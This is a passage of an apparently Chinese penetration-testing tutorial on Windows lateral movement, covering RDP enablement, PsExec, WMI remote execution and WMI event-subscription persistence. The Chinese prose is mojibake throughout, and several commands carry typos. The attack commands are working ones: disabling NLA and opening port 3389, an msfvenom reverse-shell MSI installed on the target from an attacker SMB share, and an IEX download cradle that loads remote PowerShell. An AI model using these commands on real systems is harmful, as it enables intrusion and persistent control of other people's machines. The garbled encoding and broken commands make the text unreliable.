æ­¤ä¼šåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé™åˆ¶å·¥ä½œç»„ç¯å¢ƒä¸­çš„æ¨ªå‘ç§»åŠ¨ã€‚</p><p>å¦‚æœæœ‰æƒé™çš„è¯å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤æ¥é‡å¯ç³»ç»Ÿå…³é—­UAC Remote Restrictionsï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><h1 id="è¿œç¨‹æ¡Œé¢åˆ©ç”¨"><a href="#è¿œç¨‹æ¡Œé¢åˆ©ç”¨" class="headerlink" title="è¿œç¨‹æ¡Œé¢åˆ©ç”¨"></a>è¿œç¨‹æ¡Œé¢åˆ©ç”¨</h1><p>è¿œç¨‹æ¡Œé¢åè®®(Remote Desktop Protocolï¼ŒRDP)æ˜¯å¾®è½¯ä» Windows Server 2000 å¼€å§‹æä¾›çš„åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥åŠŸèƒ½ç™»å½•å¹¶ç®¡ç†è¿œç¨‹ä¸»æœºï¼Œæ‰€æœ‰æ“ä½œå°±åƒåœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šæ“ä½œä¸€æ ·ã€‚è¿œç¨‹æ¡Œé¢åè®®é»˜è®¤ç›‘å¬ TCP 3389 ç«¯å£ã€‚</p><p>å¯ä»¥åˆ©ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œå®æ—¶æ“ä½œï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•å¯èƒ½å°†å·²ç™»å½•çš„ç”¨æˆ·å¼ºåˆ¶é€€å‡ºï¼Œå®¹æ˜“è¢«ç®¡ç†å‘˜å‘ç°ã€‚</p><h2 id="è¿œç¨‹æ¡Œé¢çš„ç¡®å®šå’Œå¼€å¯"><a href="#è¿œç¨‹æ¡Œé¢çš„ç¡®å®šå’Œå¼€å¯" class="headerlink" title="è¿œç¨‹æ¡Œé¢çš„ç¡®å®šå’Œå¼€å¯"></a>è¿œç¨‹æ¡Œé¢çš„ç¡®å®šå’Œå¼€å¯</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤é€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨æ¥ç¡®å®šå½“å‰ä¸»æœºæ˜¯å¦å¼€å¯äº†è¿œç¨‹æ¡Œé¢åŠŸèƒ½ï¼Œè‹¥å­—æ®µä¸º0ï¼Œåˆ™è¯´æ˜RDPæœåŠ¡å·²ç»å¯åŠ¨ï¼Œè‹¥ä¸º1ï¼Œåˆ™è¯´æ˜ç¦ç”¨ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448982.png" alt="image-20240415001846792"></p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯ä»¥å¼€å¯è¿œç¨‹æ¡Œé¢åŠŸèƒ½ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server&quot; /v fDenyTSconnections /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å…³é—­â€œä»…å…è®¸è¿è¡Œä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥â€(é‰´æƒ)</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®é˜²ç«å¢™ç­–ç•¥æ”¾è¡Œ3389ç«¯å£</span><br>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow<br></code></pre></td></tr></table></figure><p>å¯¹äºè¿œç¨‹ä¸»æœºï¼Œå¯ä»¥é€šè¿‡WMIæ¥å¼€å¯è¿œç¨‹æ¡Œé¢åŠŸèƒ½,ä¸è¿‡éœ€è¦æŒ‡å®šè¿œç¨‹ä¸»æœºçš„IPã€ä¸»æœºåå’Œç”¨æˆ·å‡­æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /Node:10.10.10.19 /User:Administrator /Password:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1<br></code></pre></td></tr></table></figure><h2 id="rdp-hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h2><h2 id="sharprdp"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><p>SharpRDP æ˜¯ä¸€æ¬¾å¼€æºå·¥å…·ï¼Œå¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢åè®®åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸”ä¸éœ€ GUI å®¢æˆ·ç«¯ã€‚è¯¥å·¥å…·éœ€è¦è¿œç¨‹ä¸»æœºå¼€å¯è¿œç¨‹æ¡Œé¢åŠŸèƒ½ï¼Œå¹¶ä¸”é˜²ç«å¢™æ”¾è¡Œ 3389 ç«¯å£ã€‚</p><p>é€šå¸¸åœ¨å†…ç½‘æ¸—é€æ—¶ï¼Œå¦‚æœæƒ³ç™»å½•ä¸€å°å†…ç½‘ä¸»æœºçš„è¿œç¨‹æ¡Œé¢ï¼Œéœ€è¦å…ˆæ­å»ºå†…ç½‘ä»£ç†ç„¶åä½¿ç”¨ RDP å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ã€‚ä½†æ˜¯ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ç›´æ¥å°† SharpRDP ä¸Šä¼ åˆ°è·³æ¿æœºï¼Œç„¶åç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­æ®ï¼Œå¯¹å†…ç½‘å…¶ä»–ä¸»æœºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚è¿™æ ·å°±çœå»äº†å†…ç½‘ä»£ç†ç­‰ä¸­é—´ç¯èŠ‚ã€‚</p><h1 id="psexec-è¿œç¨‹æ§åˆ¶"><a href="#PsExec-è¿œç¨‹æ§åˆ¶" class="headerlink" title="PsExec è¿œç¨‹æ§åˆ¶"></a>PsExec è¿œç¨‹æ§åˆ¶</h1><p>PsExec æ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„ä¸€æ¬¾å®ç”¨çš„ Windows è¿œç¨‹æ§åˆ¶å·¥å…·ï¼Œå¯ä»¥æ ¹æ®å‡­æ®åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œç®¡ç†æ“ä½œï¼Œå¹¶ä¸”å¯ä»¥è·å¾—ä¸å‘½ä»¤è¡Œå‡ ä¹ç›¸åŒçš„å®æ—¶äº¤äº’æ€§ã€‚PsExecæœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€å°±æ˜¯å¯ä»¥åœ¨è¿œç¨‹ç³»ç»Ÿä¸­å¯åŠ¨äº¤äº’å¼å‘½ä»¤æç¤ºçª—å£ï¼Œä»¥ä¾¿å®æ—¶æ˜¾ç¤ºæœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ã€‚</p><p>PsExec åŸç†æ˜¯é€šè¿‡SMBè¿æ¥åˆ°æœåŠ¡ç«¯çš„Admin$å…±äº«ï¼Œå¹¶é‡Šæ”¾åä¸ºâ€œpsexesvc.exeçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åæ³¨å†Œåä¸ºâ€œPSEXESVCâ€æœåŠ¡ã€‚å½“å®¢æˆ·ç«¯æ‰§è¡Œå‘½ä»¤æ—¶ï¼ŒæœåŠ¡ç«¯é€šè¿‡PSEXESVCæœåŠ¡å¯åŠ¨ç›¸åº”çš„ç¨‹åºæ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾æ•°æ®ã€‚è¿è¡Œç»“æŸåï¼ŒPSEXESVCæœåŠ¡ä¼šè¢«åˆ é™¤ã€‚</p><p>ä½¿ç”¨PsExecè¿›è¡Œæ“ä½œéœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¿œç¨‹ä¸»æœºå¼€å¯äº†Admin$å…±äº«</li><li>è¿œç¨‹ä¸»æœºæœªå¼€å¯é˜²ç«å¢™æˆ–è€…æ”¾è¡Œ445ç«¯å£</li></ol><p>æ»¡è¶³æ¡ä»¶æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œç”¨åŸŸç®¡ç†å‘˜çš„è´¦æˆ·è¿æ¥è¿œç¨‹ä¸»æœºï¼Œå¹¶ä»¥SYSTEMæƒé™å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-accepteulaï¼Œç¦æ­¢å¼¹å‡ºè®¸å¯è¯å¯¹è¯æ¡†;-uï¼ŒæŒ‡å®šè¿œç¨‹ä¸»æœºçš„ç”¨æˆ·å;-pï¼ŒæŒ‡å®šç”¨æˆ·çš„å¯†ç </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-sï¼Œä»¥ SYSTEMæƒé™å¯åŠ¨è¿›ç¨‹ï¼Œå¦‚æœæœªæŒ‡å®šè¯¥å‚æ•°ï¼Œå°±å°†ä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨è¿›ç¨‹</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå·²æœ‰ç›¸åº”å‡­æ®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨PsExecè¿æ¥è¿œç¨‹ä¸»æœº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 cmd.exe<br></code></pre></td></tr></table></figure><h1 id="wmiçš„åˆ©ç”¨"><a href="#WMIçš„åˆ©ç”¨" class="headerlink" title="WMIçš„åˆ©ç”¨"></a>WMIçš„åˆ©ç”¨</h1><p>WMI(Windows Management Instrumentationï¼ŒWindows ç®¡ç†è§„èŒƒ)æ˜¯ä¸€é¡¹æ ¸å¿ƒçš„Windows ç®¡ç†æŠ€æœ¯ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ WMI ç®¡ç†æœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºã€‚Windows ä¸ºè¿œç¨‹ä¼ è¾“WMIæ•°æ®æä¾›äº†ä¸¤ä¸ªå¯ç”¨çš„åè®®,å³åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹(Distributed Component Object Modelï¼ŒDCOM)å’Œ Windowsè¿œç¨‹ç®¡ç†(Windows Remote Managementï¼ŒWinRM)ï¼Œä½¿å¾—WMIå¯¹è±¡çš„æŸ¥è¯¢ã€äº‹ä»¶æ³¨å†Œã€WMIç±»æ–¹æ³•çš„æ‰§è¡Œå’Œç±»çš„åˆ›å»ºç­‰æ“ä½œéƒ½èƒ½å¤Ÿè¿œç¨‹è¿›è¡Œã€‚</p><p>åœ¨æ¨ªå‘ç§»åŠ¨æ—¶ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åˆ©ç”¨WMIæä¾›çš„ç®¡ç†åŠŸèƒ½ï¼Œé€šè¿‡å·²è·å–çš„ç”¨æˆ·å‡­æ®ï¼Œä¸æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºè¿›è¡Œäº¤äº’ï¼Œå¹¶æ§åˆ¶å…¶æ‰§è¡Œå„ç§è¡Œä¸ºã€‚ç›®å‰æœ‰ä¸¤ç§å¸¸è§çš„åˆ©ç”¨æ–¹æ³•:<strong>ä¸€æ˜¯é€šè¿‡è°ƒç”¨ WMI çš„ç±»æ–¹æ³•è¿›è¡Œè¿œç¨‹æ‰§è¡Œ</strong>,å¦‚ Win32 Process ç±»ä¸­çš„ Create æ–¹æ³•å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè¿›ç¨‹,Win32 Productç±»ä¸­çš„Installæ–¹æ³•å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šå®‰è£…æ¶æ„çš„MSI<strong>äºŒæ˜¯è¿œç¨‹éƒ¨ç½²WMIäº‹ä»¶è®¢é˜…ï¼Œåœ¨ç‰¹å®šæ¡çš„äº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘æ”»å‡»ã€‚</strong></p><p>åˆ©ç”¨WMIæ¨ªå‘ç§»åŠ¨éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¿œç¨‹ä¸»æœºçš„WMIæœåŠ¡ä¸ºå¼€å¯çŠ¶æ€(é»˜è®¤å¼€å¯)</li><li>è¿œç¨‹ä¸»æœºé˜²ç«å¢™æ”¾è¡Œ135ç«¯å£ï¼Œè¿™æ˜¯WMIé»˜è®¤çš„ç®¡ç†ç«¯å£</li></ol><h2 id="å¸¸è§„åˆ©ç”¨æ–¹æ³•"><a href="#å¸¸è§„åˆ©ç”¨æ–¹æ³•" class="headerlink" title="å¸¸è§„åˆ©ç”¨æ–¹æ³•"></a>å¸¸è§„åˆ©ç”¨æ–¹æ³•</h2><p>åœ¨ Windows ä¸Šå¯ä»¥é€šè¿‡wmic.exeå’ŒPowerShell Cmdletæ¥ä½¿ç”¨ WMIæ•°æ®å’Œæ‰§è¡Œ WMIæ–¹æ³•ã€‚</p><p>Windows PowerShell ä¹Ÿæä¾›äº†è®¸å¤šå¯ä»¥ä¸ WMIè¿›è¡Œäº¤äº’çš„Cmdletï¼Œå¦‚Invoke-WmiMethodã€Set-Wmilnstance ç­‰ã€‚</p><p><strong>æ‰§è¡Œè¿œç¨‹æŸ¥è¯¢</strong></p><p>æŸ¥è¯¢è¿œç¨‹ä¸»æœºè¿›ç¨‹ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process list brief<br></code></pre></td></tr></table></figure><p><strong>åˆ›å»ºè¿œç¨‹è¿›ç¨‹</strong></p><p>é€šè¿‡è°ƒç”¨ Win32_Process.Createæ–¹æ³•åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè¿›ç¨‹,å¯åŠ¨CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process call create<br>&quot;cmd.exe /c ipconfig &gt; C\:result.txt&quot;<br></code></pre></td></tr></table></figure><p>ç”±äº WMIC åœ¨æ‰§è¡Œå‘½ä»¤æ—¶æ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤å¯ä»¥å°†æ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶ï¼Œç„¶åé€šè¿‡å»ºç«‹å…±äº«è¿æ¥ç­‰æ–¹å¼ä½¿ç”¨ type å‘½ä»¤è¿œç¨‹è¯»å–ã€‚</p><p><strong>è¿œç¨‹å®‰è£…MSIæ–‡ä»¶</strong></p><p>é€šè¿‡è°ƒç”¨ Win32 Product.Install æ–¹æ³•ï¼Œå¯ä»¥æ§åˆ¶è¿œç¨‹ä¸»æœºå®‰è£…æ¶æ„çš„ MSI(MicrosoftInstaller)æ–‡ä»¶ï¼Œä»è€Œè·å–å…¶æƒé™ã€‚</p><ol><li><p>ä½¿ç”¨Metasploitç”Ÿæˆä¸€ä¸ªæ¶æ„çš„MSIæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f ms -o reverse tcp.msi<br></code></pre></td></tr></table></figure></li><li><p>åœ¨ä¸€å°æµ‹è¯•äººå‘˜å¯æ§çš„æœåŠ¡å™¨ä¸Šæ­å»º SMB å…±äº«æœåŠ¡å™¨ï¼Œå¹¶å°†ç”Ÿæˆçš„ MSIæ–‡ä»¶æ”¾å…¥å…±äº«ç›®å½•ã€‚</p></li><li><p>åœ¨è·³æ¿æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><p>æ§åˆ¶è¿œç¨‹ä¸»æœºï¼Œé€šè¿‡UNCè·¯å¾„è¿›è¡Œè¿œç¨‹åŠ è½½æµ‹è¯•äººå‘˜æœåŠ¡å™¨çš„ MSI æ–‡ä»¶å¹¶è¿›è¡Œå®‰è£…ï¼ŒæˆåŠŸè·å–è¿œç¨‹ä¸»æœºçš„æƒé™.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10,10.19 /user:Administrator /password:Admin@123 product call install<br>PackageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;<br></code></pre></td></tr></table></figure></li></ol><h2 id="å¸¸è§åˆ©ç”¨å·¥å…·"><a href="#å¸¸è§åˆ©ç”¨å·¥å…·" class="headerlink" title="å¸¸è§åˆ©ç”¨å·¥å…·"></a>å¸¸è§åˆ©ç”¨å·¥å…·</h2><p><strong>Wmiexec</strong></p><p>Impacket é¡¹ç›®çš„ wmiexec.pyèƒ½å¤Ÿä»¥å…¨äº¤äº’æˆ–åŠäº¤äº’çš„æ–¹å¼ï¼Œé€šè¿‡ WMI åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚æ³¨æ„ï¼Œè¯¥å·¥å…·éœ€è¦è¿œç¨‹ä¸»æœºå¼€å¯ 135 å’Œ 445 ç«¯å£ï¼Œå…¶ä¸­ 445 ç«¯å£ç”¨äºä¼ è¾“å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾ã€‚</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè·å–è¿œç¨‹ä¸»æœºçš„äº¤äº’å¼å‘½ä»¤è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python wmiexec.py &lt;Domian&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448983.png" alt="image-20240415090722425"></p><p>Windowså¹³å°å¯ä»¥ä½¿ç”¨PyInstallerï¼Œå°†wmiexec.pyæ‰“åŒ…æˆç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶exeï¼Œæ‰“åŒ…å®Œæˆåå¯ä»¥ç›´æ¥ä¸Šä¼ åˆ°Windowsä¸»æœºä¸­è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pip3 install pyinstaller<br>cd impacket\examples<br>pyinstaller -F wmiexec.py<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448984.png" alt="image-20240415091103406"></p><p><strong>Invoke-WmiCommand</strong></p><p>Invoke-WmiCommand.ps1æ˜¯PowerSploit é¡¹ç›®ä¸­çš„ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡ PowerShellè°ƒç”¨WMIæ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">è¿œç¨‹åŠ è½½Invokeâ€”WmiCommand.ps1è„šæœ¬</span><br>IEX(New-Object Net.Webclient).DownloadString(&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šè¿œç¨‹ç³»ç»Ÿç”¨æˆ·å</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šç”¨æˆ·çš„å¯†ç </span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å°†ç”¨æˆ·åå’Œå¯†ç æ•´åˆï¼Œä»¥ä¾¿å¯¼å…¥Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-Object-TypeName System.Mangement.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šè¿œç¨‹ä¸»æœºçš„IPå’Œè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote = Invoke-WmiCommand -Payload (ipconfig) -Credential <span class="hljs-variable">$Cred</span> -ComputerName <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è¾“å‡ºå‘½ä»¤æ‰§è¡Œå›æ˜¾</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote.PayloadOutput</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448985.png" alt="image-20240415092051471"></p><p>æ­¤å¤–ï¼ŒPowerShellå†…ç½®çš„Invoke-WMIMethodä¹Ÿå¯ä»¥åœ¨è¿œç¨‹ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤æˆ–ç¨‹åºã€‚</p><h2 id="wmiäº‹ä»¶è®¢é˜…çš„åˆ©ç”¨"><a href="#WMIäº‹ä»¶è®¢é˜…çš„åˆ©ç”¨" class="headerlink" title="WMIäº‹ä»¶è®¢é˜…çš„åˆ©ç”¨"></a>WMIäº‹ä»¶è®¢é˜…çš„åˆ©ç”¨</h2><p>WMIæä¾›äº†å¼ºå¤§çš„äº‹ä»¶å¤„ç†ç³»ç»Ÿï¼Œå‡ ä¹å¯ä»¥ç”¨äºå¯¹æ“ä½œç³»ç»Ÿä¸Šå‘ç”Ÿçš„ä»»ä½•äº‹ä»¶åšå‡ºå“åº”ã€‚ä¾‹å¦‚ï¼Œå½“åˆ›å»ºæŸè¿›ç¨‹æ—¶ï¼Œé€šè¿‡WMIäº‹ä»¶è®¢é˜…æ¥æ‰§è¡Œé¢„å…ˆè®¾ç½®çš„è„šæœ¬ã€‚å…¶ä¸­ï¼Œè§¦å‘äº‹ä»¶çš„å…·ä½“æ¡ä»¶è¢«ç§°ä¸ºâ€œäº‹ä»¶è¿‡æ»¤å™¨â€(Event Filter)ï¼Œå¦‚ç”¨æˆ·ç™»å½•ã€æ–°è¿›ç¨‹åˆ›å»ºç­‰;å¯¹æŒ‡å®šäº‹ä»¶å‘ç”Ÿåšå‡ºçš„å“åº”è¢«ç§°ä¸ºâ€œäº‹ä»¶æ¶ˆè´¹è€…â€(Event Consumer)ï¼ŒåŒ…æ‹¬ä¸€ç³»åˆ—å…·ä½“çš„æ“ä½œï¼Œå¦‚è¿è¡Œè„šæœ¬ã€è®°å½•æ—¥å¿—ã€å‘é€é‚®ä»¶ç­‰ã€‚åœ¨éƒ¨ç½²äº‹ä»¶è®¢é˜…æ—¶ï¼Œéœ€è¦åˆ†åˆ«æ„å»º Filterå’Œ Consumer ä¸¤éƒ¨åˆ†ï¼Œå¹¶å°†äºŒè€…ç»‘å®šåœ¨ä¸€èµ·ã€‚</p><p>æ‰€æœ‰çš„äº‹ä»¶è¿‡æ»¤å™¨éƒ½è¢«å­˜å‚¨ä¸ºä¸€ä¸ª ROOT\subscription:__EventFilter å¯¹è±¡çš„å®ä¾‹ï¼Œå¯ä»¥é€šè¿‡åˆ›å»ºEventFilter å¯¹è±¡å®ä¾‹æ¥éƒ¨ç½²äº‹ä»¶è¿‡æ»¤å™¨ã€‚äº‹ä»¶æ¶ˆè´¹è€…æ˜¯åŸºäº ROOTsubscription:__EventConsumer ç³»ç»Ÿç±»æ´¾ç”Ÿæ¥çš„ç±»ã€‚ç³»ç»Ÿæä¾›äº†å¸¸ç”¨çš„æ ‡å‡†äº‹ä»¶æ¶ˆè´¹ç±»ã€‚</p><table><thead><tr><th>äº‹ä»¶æ¶ˆè´¹ç±»</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>LogFileEventConsumer</td><td>å°†äº‹ä»¶æ•°æ®å†™å…¥æŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶</td></tr><tr><td>ActiveScriptEventConsumer</td><td>æ‰§è¡ŒåµŒå…¥çš„VBScriptæˆ–JavaScriptè„šæœ¬</td></tr><tr><td>NTEventLogEventConsumer</td><td>åˆ›å»ºä¸€ä¸ªåŒ…å«äº‹ä»¶æ•°æ®çš„äº‹ä»¶æ—¥å¿—æ¡ç›®</td></tr><tr><td>SMTPEventConsumer</td><td>å‘é€ä¸€å°åŒ…å«äº‹ä»¶æ•°æ®çš„ç”µå­é‚®ä»¶</td></tr><tr><td>CommandLineEventConsumer</td><td>æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤</td></tr></tbody></table><p>æµ‹è¯•äººå‘˜å¯ä»¥åˆ©ç”¨WMIåœ¨è¿œç¨‹ä¸»æœºéƒ¨ç½²æ°¸ä¹…çš„äº‹ä»¶è®¢é˜…ï¼Œåœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œä»»æ„ä»£ç æˆ–è€…å‘½ä»¤ã€‚è¯¥æŠ€æœ¯ä¸»è¦ç”¨æ¥åœ¨ç›®æ ‡ç³»ç»Ÿå®Œæˆæƒé™æŒä¹…åŒ–ï¼Œäº¦å¯ç”¨äºæ¨ªå‘ç§»åŠ¨ï¼Œå¹¶ä¸”éœ€è¦æä¾›è¿œç¨‹ä¸»æœºçš„ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·å‡­æ®ã€‚</p><p><strong>æ‰‹åŠ¨åˆ©ç”¨</strong></p><p>é€šè¿‡æ‰‹åŠ¨æ‰§è¡ŒPowerShellå‘½ä»¤æ¥è¿›è¡Œåˆ©ç”¨</p><ol><li><p>æ•´åˆPSCredentialï¼Œç”¨äºåç»­è¿‡ç¨‹çš„è®¤è¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">Username =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =<span class="hljs-string">&quot;Admin@123&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SecurePassword = <span class="hljs-variable">$Password</span> | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Credential = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$Username</span>,<span class="hljs-variable">$SecurePassword</span></span><br></code></pre></td></tr></table></figure></li><li><p>è®¾ç½®æ”»å‡»ç›®æ ‡å’Œå…¶ä»–å…¬å…±å‚æ•°</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs = @&#123;&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SComputerName = <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;Credential&#x27;</span>] = <span class="hljs-variable">$Credential</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;ComputerName&#x27;</span>]=<span class="hljs-variable">$ComputerName</span></span><br></code></pre></td></tr></table></figure></li><li><p>åœ¨è¿œç¨‹ä¸»æœºéƒ¨ç½²â€TestFilterâ€äº‹ä»¶è¿‡æ»¤å™¨ï¼Œç”¨äºæŸ¥è¯¢svchost.exeè¿›ç¨‹çš„äº§ç”Ÿã€‚é€šè¿‡Set-WmiInstance Cmdletåˆ›å»ºä¸€ä¸ª__EventFilterç±»çš„å®ä¾‹å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilterArgs = @&#123;</span><br>    EventNamespace =&quot;root/cimv2<br>    Name =&quot;TestFiltern<br>    Query = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;<br>    QueryLanguage =&#x27;WQL&#x27;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments <span class="hljs-variable">$EventFilterArgs</span> 